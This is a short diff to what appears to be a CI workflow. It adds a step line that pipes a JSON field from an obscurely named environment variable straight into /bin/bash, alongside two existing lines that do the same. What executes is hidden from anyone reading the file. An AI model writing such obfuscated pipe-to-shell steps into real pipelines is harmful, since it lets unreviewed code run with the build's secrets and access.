@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$wa0" | jq -r .cvb68 | /bin/bash
           echo $noaas84764 | jq -r .aiq2 | /bin/bash
+          echo $qe409 | jq -r .ogijq8 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
